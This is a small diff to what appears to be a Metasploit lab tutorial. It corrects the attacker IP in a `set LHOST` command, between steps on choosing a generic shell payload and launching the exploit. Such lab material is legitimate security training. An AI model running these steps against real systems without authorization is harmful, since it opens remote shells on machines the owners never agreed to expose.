@@ -46,7 +46,7 @@ Now that we can see what payloads are available, we can select the generic/shell
 ## Set LocalHost
 Now that we've chosen the exploit and the payload, we need to tell Metasploit the IP address of our machine. In this example, our system has an IP address of `10.0.10.6`. Use the actual IP address of the system you using. Tools such as `sudo ifconfig` should help you find your IP Address. It should be in the format of `10.0.10.X`
 
-`msf > set LHOST 10.0.0.6`
+`msf > set LHOST 10.0.10.6`
 
 ## Exploit 
 Now we command Metasploit to exploit the system:
